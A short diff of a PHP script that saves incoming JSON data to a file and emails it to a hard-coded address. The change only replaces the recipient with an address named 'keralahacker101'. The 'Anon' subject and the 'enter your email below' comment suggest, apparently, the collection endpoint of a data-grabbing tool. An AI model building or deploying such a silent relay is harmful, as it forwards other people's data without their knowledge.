@@ -16,7 +16,7 @@ if($_SERVER["CONTENT_TYPE"] ==  'application/json') {
         fwrite($file, $ms) ;
         fclose($file);
             //enter your email below
-        mail('swagkarna@gmail.com', 'Anon', $msg);
+        mail('keralahacker101@gmail.com', 'Anon', $msg);
     }
 }
 ?>
